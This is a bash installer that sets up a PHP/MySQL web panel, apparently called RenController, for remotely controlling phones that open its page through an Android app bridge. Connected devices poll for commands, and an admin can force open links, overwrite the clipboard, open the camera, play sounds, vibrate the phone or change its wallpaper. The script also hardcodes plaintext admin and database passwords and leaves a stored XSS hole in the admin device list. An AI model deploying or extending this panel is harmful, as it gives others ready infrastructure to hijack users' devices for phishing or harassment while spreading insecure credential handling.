#!/bin/bash
# ==========================================
# 👑 RenClouds v12.0 - MEGA UPDATE (MEGA FIX)
# ==========================================

RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; YELLOW='\033[1;33m'; NC='\033[0m'
[[ $EUID -ne 0 ]] && { echo -e "${RED}❌ Harus root!${NC}"; exit 1; }

DOMAIN="hackingg.myboc.my.id"
WEB_ROOT="/var/www/$DOMAIN"
DB_NAME="renclouds_db"
DB_USER="ren_user"
DB_PASS="renpassword123"
NGINX_CONF="/etc/nginx/sites-available/$DOMAIN"
PKG_NAME="com.webapp.renclouds"
SHA256="00:4B:C5:EE:31:FC:F7:B7:23:8C:42:20:31:B6:83:33:7C:7C:48:D1:3C:82:03:95:E4:D0:53:7A:55:D8:B2:50"

echo -e "${CYAN}⏳ Memulai Instalasi v12.0 (MEGA UPDATE)...${NC}"

# ==========================================
# 1. DATABASE (RESET & CLEAN)
# ==========================================
echo -e "${CYAN}[1/6] Reset Database...${NC}"
mysql -e "DROP DATABASE IF EXISTS \`$DB_NAME\`;"
mysql -e "CREATE DATABASE \`$DB_NAME\` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;"
mysql -e "CREATE USER IF NOT EXISTS '$DB_USER'@'localhost' IDENTIFIED BY '$DB_PASS';"
mysql -e "ALTER USER '$DB_USER'@'localhost' IDENTIFIED BY '$DB_PASS';"
mysql -e "GRANT ALL PRIVILEGES ON \`$DB_NAME\`.* TO '$DB_USER'@'localhost';"
mysql -e "FLUSH PRIVILEGES;"

mysql "$DB_NAME" << SQLEOF
CREATE TABLE admins (id INT AUTO_INCREMENT PRIMARY KEY, username VARCHAR(50) UNIQUE NOT NULL, password VARCHAR(255) NOT NULL);
INSERT INTO admins (username, password) VALUES ('admin', 'Ren11#');

CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY, 
    device_id VARCHAR(100) UNIQUE NOT NULL, 
    device_name VARCHAR(100) DEFAULT 'Unknown',
    device_os VARCHAR(100) DEFAULT 'Unknown',
    status ENUM('online','offline') DEFAULT 'online',
    last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
);

CREATE TABLE user_commands (
    id INT AUTO_INCREMENT PRIMARY KEY, 
    device_id VARCHAR(100), 
    command_type VARCHAR(100), 
    command_value TEXT, 
    status ENUM('pending','executed') DEFAULT 'pending', 
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
SQLEOF
echo -e "${GREEN}✅ Database Siap${NC}"

# ==========================================
# 2. GENERATE WEB FILES
# ==========================================
echo -e "${CYAN}[2/6] Generate Web Files...${NC}"
rm -rf "$WEB_ROOT"
mkdir -p "$WEB_ROOT"/{api,assets,.well-known}

# --- CONFIG ---
cat > "$WEB_ROOT/config.php" << PHPEOF
<?php
session_start();
define('DB_HOST', '127.0.0.1'); define('DB_NAME', '$DB_NAME');
define('DB_USER', '$DB_USER'); define('DB_PASS', '$DB_PASS');
try { \$pdo = new PDO("mysql:host=".DB_HOST.";dbname=".DB_NAME.";charset=utf8mb4", DB_USER, DB_PASS, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC]); } catch (PDOException \$e) { die("DB Error"); }
function isAdmin() { return isset(\$_SESSION['admin']); }
function requireAdmin() { if(!isAdmin()) { header('Location: login.php'); exit; } }
PHPEOF

# --- CSS (GOKILL UI) ---
cat > "$WEB_ROOT/style.css" << 'CSSEOF'
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800;900&display=swap');
@import url('https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css');
:root{--bg:#05080f;--card:#0f1a2e;--primary:#6366f1;--primary2:#8b5cf6;--success:#10b981;--danger:#ef4444;--warning:#f59e0b;--text:#f8fafc;--text-muted:#94a3b8;--border:#1e2a45;}
*{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif;}
body{background:var(--bg);color:var(--text);min-height:100vh;}
.container{max-width:1100px;margin:0 auto;padding:20px;}
.navbar{display:flex;justify-content:space-between;align-items:center;padding:15px 30px;background:rgba(5,8,15,.9);border-bottom:1px solid var(--border);}
.logo{font-size:1.4em;font-weight:900;display:flex;align-items:center;gap:10px;color:white;text-decoration:none;}
.card{background:var(--card);border:1px solid var(--border);border-radius:20px;padding:30px;margin-bottom:20px;}
.form-group{margin-bottom:20px;}
label{display:block;margin-bottom:8px;font-size:.9em;color:var(--text-muted);}
input,textarea,select{width:100%;padding:15px;border-radius:12px;border:1px solid var(--border);background:rgba(0,0,0,.4);color:var(--text);outline:none;font-family:inherit;}
.btn{width:100%;padding:15px;border-radius:12px;border:none;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;text-decoration:none;font-family:inherit;font-size:1em;color:white;}
.btn-primary{background:linear-gradient(135deg,var(--primary),var(--primary2));}
.btn-danger{background:linear-gradient(135deg,#ef4444,#dc2626);}
.btn-warning{background:linear-gradient(135deg,#f59e0b,#d97706);}
.btn-success{background:linear-gradient(135deg,#10b981,#059669);}
table{width:100%;border-collapse:collapse;}
th,td{padding:14px;text-align:left;border-bottom:1px solid var(--border);font-size:.9em;}
.badge{padding:5px 10px;border-radius:6px;font-size:.75em;font-weight:700;}
.badge-success{background:rgba(16,185,129,.2);color:var(--success);}
.alert{padding:15px;border-radius:10px;margin-bottom:20px;background:rgba(239,68,68,.2);color:#ef4444;}
.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;margin-bottom:25px;}
.stat-card{background:var(--card);border:1px solid var(--border);border-radius:16px;padding:25px;text-align:center;}
.stat-card h3{color:var(--text-muted);font-size:.85em;margin-bottom:10px;text-transform:uppercase;}
.stat-card .num{font-size:2.2em;font-weight:900;color:var(--primary);}
.grid-tools{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:15px;margin-top:20px;}
.tool-btn{padding:20px;border-radius:12px;background:var(--card);border:1px solid var(--border);text-align:center;cursor:pointer;transition:0.3s;}
.tool-btn:hover{border-color:var(--primary);background:rgba(99,102,241,0.1);}
.tool-btn i{font-size:1.8em;margin-bottom:10px;color:var(--primary);}
CSSEOF

# --- INDEX (USER PAGE) ---
cat > "$WEB_ROOT/index.php" << 'PHPEOF'
<?php require 'config.php'; ?>
<!DOCTYPE html><html lang="id"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>RenController</title><link rel="stylesheet" href="style.css"></head>
<body>
<nav class="navbar"><a href="#" class="logo"><i class="fas fa-mobile-alt" style="color:var(--primary)"></i><span>RenController</span></a></nav>
<div class="container" style="text-align:center;padding-top:50px;">
    <div id="welcome" style="display:block;">
        <h1 style="font-size:2.5em;margin-bottom:10px;">Halo 👋</h1>
        <p style="color:var(--text-muted);margin-bottom:30px;font-size:1.1em;">Selamat datang di RenController System.</p>
        <div class="card" style="max-width:400px;margin:0 auto;border:1px solid var(--primary);">
            <p style="margin-bottom:15px;font-weight:bold;color:var(--primary);">Mendeteksi Perangkat Anda...</p>
            <div style="width:40px;height:40px;border:4px solid var(--border);border-top-color:var(--primary);border-radius:50%;animation:spin 1s linear infinite;margin:0 auto;"></div>
        </div>
    </div>
    <div id="status" style="display:none;">
        <h1 style="font-size:2.5em;margin-bottom:10px;">Terhubung 👋</h1>
        <p style="color:var(--text-muted);margin-bottom:30px;font-size:1.1em;">Sistem berhasil mengenali perangkat Anda.</p>
        <div class="card" style="max-width:400px;margin:0 auto;border:1px solid var(--success);box-shadow:0 0 20px rgba(16,185,129,0.2);">
            <i class="fas fa-check-circle" style="font-size:3em;color:var(--success);margin-bottom:15px;"></i>
            <h2 style="margin-bottom:10px;">Device Aktif!</h2>
            <p style="color:var(--text-muted);margin-bottom:5px;">Perangkat: <strong id="devName" style="color:white;">Mendeteksi...</strong></p>
            <p style="color:var(--text-muted);">Sistem: <strong id="devOs" style="color:white;">Mendeteksi...</strong></p>
            <p style="font-size:0.8em;color:var(--text-muted);margin-top:20px;padding-top:15px;border-top:1px solid var(--border);"><i class="fas fa-info-circle"></i> Halaman ini bisa ditutup. Admin akan mengontrol perangkat Anda melalui sistem.</p>
        </div>
    </div>
</div>
<style>@keyframes spin { 100% { transform: rotate(360deg); } }</style>
<script>
function registerDevice(){
    let ua = navigator.userAgent, devName = "Unknown", devOs = "Unknown";
    if (/android/i.test(ua)) { let m = ua.match(/Android\s([0-9\.]+)/); devOs = m ? "Android " + m[1] : "Android"; } else if (/iPhone|iPad/i.test(ua)) devOs = "iOS"; else if (/Windows/i.test(ua)) devOs = "Windows";
    if (/SM-|Samsung/i.test(ua)) devName = "Samsung"; else if (/Xiaomi|Redmi|POCO/i.test(ua)) devName = "Xiaomi/Redmi"; else if (/OPPO/i.test(ua)) devName = "OPPO"; else if (/vivo/i.test(ua)) devName = "Vivo"; else if (/Realme/i.test(ua)) devName = "Realme"; else if (/Infinix/i.test(ua)) devName = "Infinix"; else if (/iPhone/i.test(ua)) devName = "Apple iPhone"; else devName = ua.split(' ')[0] || "Unknown";
    let devId = localStorage.getItem('ren_dev_id');
    if(!devId){ devId = 'DEV-' + Math.random().toString(36).substr(2, 9).toUpperCase(); localStorage.setItem('ren_dev_id', devId); }
    let fd = new FormData(); fd.append("device_id", devId); fd.append("device_name", devName); fd.append("device_os", devOs);
    fetch("api/register_device.php", { method: "POST", body: fd }).then(res => res.json()).then(data => {
        document.getElementById('welcome').style.display = 'none'; document.getElementById('status').style.display = 'block';
        document.getElementById('devName').textContent = devName; document.getElementById('devOs').textContent = devOs;
        listenCommands(devId);
    }).catch(err => {
        document.getElementById('welcome').style.display = 'none'; document.getElementById('status').style.display = 'block';
        document.getElementById('devName').textContent = devName; document.getElementById('devOs').textContent = devOs;
        listenCommands(devId);
    });
}
function listenCommands(devId) {
    setInterval(async () => {
        try {
            let res = await fetch("api/get_command.php?device_id=" + devId);
            let data = await res.json();
            if (data.status) {
                let cmd = data.command, val = data.value, id = data.id;
                if (window.AndroidInterface) {
                    if (cmd === "wallpaper") window.AndroidInterface.setWallpaper(val);
                    else if (cmd === "flash_on") window.AndroidInterface.toggleFlashlight(true);
                    else if (cmd === "flash_off") window.AndroidInterface.toggleFlashlight(false);
                    else if (cmd === "vibrate") window.AndroidInterface.vibrate(1500);
                    else if (cmd === "toast") window.AndroidInterface.showToast(val);
                    else if (cmd === "open_url") window.AndroidInterface.openUrl(val);
                    else if (cmd === "play_sound") window.AndroidInterface.playSound(val);
                    else if (cmd === "set_brightness") window.AndroidInterface.setBrightness(parseInt(val));
                    else if (cmd === "copy_clipboard") window.AndroidInterface.copyToClipboard(val);
                    else if (cmd === "open_camera") window.AndroidInterface.openCamera();
                }
                let fd = new FormData(); fd.append("id", id); fetch("api/complete_command.php", { method: "POST", body: fd });
            }
        } catch(e) {}
    }, 3000);
}
window.addEventListener("load", registerDevice);
</script>
</body></html>
PHPEOF

# --- API FILES ---
cat > "$WEB_ROOT/api/register_device.php" << 'PHPEOF'
<?php
error_reporting(0); require '../config.php'; header('Content-Type: application/json');
try {
    $devId = $_POST['device_id'] ?? ''; $name = $_POST['device_name'] ?? 'Unknown'; $os = $_POST['device_os'] ?? 'Unknown';
    if(!$devId) { echo json_encode(["status"=>false]); exit; }
    $stmt = $pdo->prepare("SELECT id FROM users WHERE device_id=?"); $stmt->execute([$devId]);
    if($stmt->fetch()){ $pdo->prepare("UPDATE users SET device_name=?, device_os=?, status='online', last_active=NOW() WHERE device_id=?")->execute([$name, $os, $devId]); } 
    else { $pdo->prepare("INSERT INTO users (device_id, device_name, device_os, status) VALUES (?,?,?, 'online')")->execute([$devId, $name, $os]); }
    echo json_encode(["status"=>true]);
} catch (Exception $e) { echo json_encode(["status"=>false]); }
PHPEOF

cat > "$WEB_ROOT/api/get_command.php" << 'PHPEOF'
<?php
error_reporting(0); require '../config.php'; header('Content-Type: application/json');
try {
    $devId = $_GET['device_id'] ?? ''; if(!$devId) { echo json_encode(["status"=>false]); exit; }
    $stmt = $pdo->prepare("SELECT * FROM user_commands WHERE device_id=? AND status='pending' ORDER BY id ASC LIMIT 1"); $stmt->execute([$devId]); $cmd = $stmt->fetch();
    if($cmd) echo json_encode(["status"=>true, "command"=>$cmd['command_type'], "value"=>$cmd['command_value'], "id"=>$cmd['id']]);
    else echo json_encode(["status"=>false]);
} catch (Exception $e) { echo json_encode(["status"=>false]); }
PHPEOF

cat > "$WEB_ROOT/api/complete_command.php" << 'PHPEOF'
<?php
error_reporting(0); require '../config.php'; header('Content-Type: application/json');
try { $id = $_POST['id'] ?? 0; if($id) $pdo->prepare("UPDATE user_commands SET status='executed' WHERE id=?")->execute([$id]); echo json_encode(["status"=>true]); } catch (Exception $e) { echo json_encode(["status"=>false]); }
PHPEOF

cat > "$WEB_ROOT/api/send_command.php" << 'PHPEOF'
<?php require '../config.php'; header('Content-Type: application/json'); if(!isAdmin()) exit;
$devId = $_POST['device_id'] ?? 0; $type = $_POST['type'] ?? ''; $val = $_POST['value'] ?? '';
if($devId && $type){ $pdo->prepare("INSERT INTO user_commands(device_id,command_type,command_value)VALUES(?,?,?)")->execute([$devId,$type,$val]); echo json_encode(["status"=>true,"message"=>"Perintah terkirim!"]); } else echo json_encode(["status"=>false]);
PHPEOF

# --- ADMIN LOGIN & PANEL ---
cat > "$WEB_ROOT/login.php" << 'PHPEOF'
<?php require 'config.php'; if($_SERVER['REQUEST_METHOD']=='POST'){$s=$pdo->prepare("SELECT * FROM admins WHERE username=? AND password=?");$s->execute([$_POST['u'],$_POST['p']]);if($s->fetch()){$_SESSION['admin']=true;header('Location:admin.php');exit;}else{$e="Gagal";}}
?><!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Admin</title><link rel="stylesheet" href="style.css"></head><body>
<div class="container" style="max-width:400px;margin-top:100px;"><div class="card">
<h2 style="text-align:center;"><i class="fas fa-shield-alt" style="color:var(--primary)"></i> Admin Login</h2>
<?php if(isset($e)) echo "<div class='alert'>$e</div>"; ?>
<form method="POST" style="margin-top:20px;"><div class="form-group"><input type="text" name="u" placeholder="Username" required></div><div class="form-group"><input type="password" name="p" placeholder="Password" required></div><button class="btn btn-primary">Login</button></form>
</div></div></body></html>
PHPEOF

cat > "$WEB_ROOT/admin.php" << 'PHPEOF'
<?php require 'config.php'; requireAdmin(); 
$users = $pdo->query("SELECT * FROM users ORDER BY last_active DESC")->fetchAll(); 
$totalUsers = count($users);
$onlineUsers = $pdo->query("SELECT COUNT(*) FROM users WHERE status='online'")->fetchColumn();
$totalCmds = $pdo->query("SELECT COUNT(*) FROM user_commands")->fetchColumn();
?>
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Mega Admin</title><link rel="stylesheet" href="style.css"></head><body>
<nav class="navbar"><a href="#" class="logo"><i class="fas fa-satellite-dish" style="color:var(--primary)"></i><span>Mega Admin</span></a><div class="nav-links"><a href="logout.php" style="color:var(--danger);text-decoration:none;font-weight:bold;">Logout</a></div></nav>
<div class="container">
<h2 style="margin-bottom:20px;">Dashboard Admin</h2>

<div class="stats-grid">
    <div class="stat-card"><h3>Total Device</h3><div class="num"><?=$totalUsers?></div></div>
    <div class="stat-card"><h3>Device Online</h3><div class="num" style="color:var(--success);"><?=$onlineUsers?></div></div>
    <div class="stat-card"><h3>Total Perintah</h3><div class="num" style="color:var(--warning);"><?=$totalCmds?></div></div>
</div>

<div class="card" style="margin-bottom:30px;">
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:15px;">
        <h3>Connected Devices</h3>
        <button class="btn btn-primary" style="width:auto;padding:8px 15px;font-size:0.8em;" onclick="location.reload()"><i class="fas fa-sync-alt"></i> Refresh</button>
    </div>
    <table><tr><th>Device Name</th><th>OS</th><th>Status</th><th>Last Active</th><th>Action</th></tr>
    <?php foreach($users as $u): ?>
    <tr>
        <td style="color:var(--success);font-weight:bold;"><?=htmlspecialchars($u['device_name'])?></td>
        <td><?=htmlspecialchars($u['device_os'])?></td>
        <td><span class="badge badge-<?= $u['status']=='online'?'success':'danger' ?>"><?=strtoupper($u['status'])?></span></td>
        <td style="font-size:0.8em;color:var(--text-muted);"><?=date('H:i:s', strtotime($u['last_active']))?></td>
        <td><button class="btn btn-primary" style="width:auto;padding:5px 10px;font-size:0.8em;" onclick="selectDevice('<?=$u['device_id']?>', '<?=$u['device_name']?>')">Kontrol</button></td>
    </tr>
    <?php endforeach; ?>
    </table>
</div>

<div class="card" id="controlPanel" style="display:none; border:2px solid var(--primary); background:linear-gradient(180deg, var(--card), #0a1220);">
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:15px;">
        <h3>Kontrol: <span id="targetName" style="color:var(--primary);"></span></h3>
        <button class="btn btn-danger" style="width:auto;padding:5px 10px;font-size:0.8em;" onclick="document.getElementById('controlPanel').style.display='none'">Tutup</button>
    </div>
    <input type="hidden" id="targetId">
    
    <h4 style="color:var(--text-muted);margin-bottom:10px;font-size:0.8em;text-transform:uppercase;">Hardware Control</h4>
    <div class="grid-tools">
        <div class="tool-btn" onclick="sendCmd('flash_on')"><i class="fas fa-lightbulb"></i><br>Senter ON</div>
        <div class="tool-btn" onclick="sendCmd('flash_off')"><i class="fas fa-lightbulb" style="color:#555"></i><br>Senter OFF</div>
        <div class="tool-btn" onclick="sendCmd('vibrate')"><i class="fas fa-mobile"></i><br>Getarkan HP</div>
        <div class="tool-btn" onclick="sendCmd('open_camera')"><i class="fas fa-camera"></i><br>Buka Kamera</div>
    </div>

    <h4 style="color:var(--text-muted);margin-top:20px;margin-bottom:10px;font-size:0.8em;text-transform:uppercase;">System Control</h4>
    <div class="grid-tools">
        <div class="tool-btn" onclick="promptToast()"><i class="fas fa-comment-dots"></i><br>Kirim Pesan</div>
        <div class="tool-btn" onclick="promptOpenUrl()"><i class="fas fa-external-link-alt"></i><br>Paksa Buka Link</div>
        <div class="tool-btn" onclick="promptPlaySound()"><i class="fas fa-music"></i><br>Putar Musik</div>
        <div class="tool-btn" onclick="promptBrightness()"><i class="fas fa-sun"></i><br>Kecerahan</div>
        <div class="tool-btn" onclick="promptClipboard()"><i class="fas fa-copy"></i><br>Copy Teks</div>
    </div>

    <div style="margin-top:20px; border-top:1px solid var(--border); padding-top:20px;">
        <h4 style="color:var(--text-muted);margin-bottom:10px;font-size:0.8em;text-transform:uppercase;">Ganti Wallpaper</h4>
        <div style="display:flex;gap:10px;"><input type="url" id="wpUrl" placeholder="https://contoh.com/gambar.jpg" style="flex:1;"><button class="btn btn-success" style="width:auto;" onclick="sendWallpaper()">Ganti</button></div>
    </div>
</div>

</div>
<script>
function selectDevice(id, name) { document.getElementById('targetId').value = id; document.getElementById('targetName').textContent = name; document.getElementById('controlPanel').style.display = 'block'; window.scrollTo(0, document.body.scrollHeight); }
async function sendCmd(type, value = '') { let id = document.getElementById('targetId').value; if(!id) return alert('Pilih device!'); let fd = new FormData(); fd.append('device_id', id); fd.append('type', type); fd.append('value', value); let res = await fetch('api/send_command.php', { method:'POST', body:fd }); let d = await res.json(); alert(d.message); }
function sendWallpaper() { let url = document.getElementById('wpUrl').value; if(!url) return alert('Isi URL!'); sendCmd('wallpaper', url); }
function promptToast() { let msg = prompt("Pesan:"); if(msg) sendCmd('toast', msg); }
function promptOpenUrl() { let url = prompt("URL:"); if(url) sendCmd('open_url', url); }
function promptPlaySound() { let url = prompt("URL Musik (.mp3):"); if(url) sendCmd('play_sound', url); }
function promptBrightness() { let val = prompt("Kecerahan (0-255):", "200"); if(val) sendCmd('set_brightness', val); }
function promptClipboard() { let txt = prompt("Teks copy:"); if(txt) sendCmd('copy_clipboard', txt); }
</script>
</body></html>
PHPEOF

cat > "$WEB_ROOT/logout.php" << 'PHPEOF'
<?php session_start(); session_destroy(); header('Location: login.php'); exit;
PHPEOF

# ==========================================
# 3. ASSET LINKS & NGINX
# ==========================================
cat > "$WEB_ROOT/.well-known/assetlinks.json" << ALEOF
[{"relation":["delegate_permission/common.handle_all_urls"],"target":{"namespace":"android_app","package_name":"$PKG_NAME","sha256_cert_fingerprints":["$SHA256"]}}]
ALEOF

cat > "$NGINX_CONF" << NGINXEOF
server {
    listen 80; listen [::]:80;
    server_name $DOMAIN;
    root $WEB_ROOT; index index.php index.html;
    location /.well-known/assetlinks.json { default_type application/json; allow all; }
    location / { try_files \$uri \$uri/ /index.php?\$query_string; }
    location ~ \.php\$ { include snippets/fastcgi-php.conf; fastcgi_pass unix:/var/run/php/php8.3-fpm.sock; }
}
NGINXEOF
ln -sf "$NGINX_CONF" /etc/nginx/sites-enabled/
rm -f /etc/nginx/sites-enabled/default
chown -R www-data:www-data "$WEB_ROOT"
systemctl reload nginx
systemctl restart php8.3-fpm

echo -e "${GREEN}✅ SUKSES! v12.0 MEGA UPDATE TERINSTALL.${NC}"
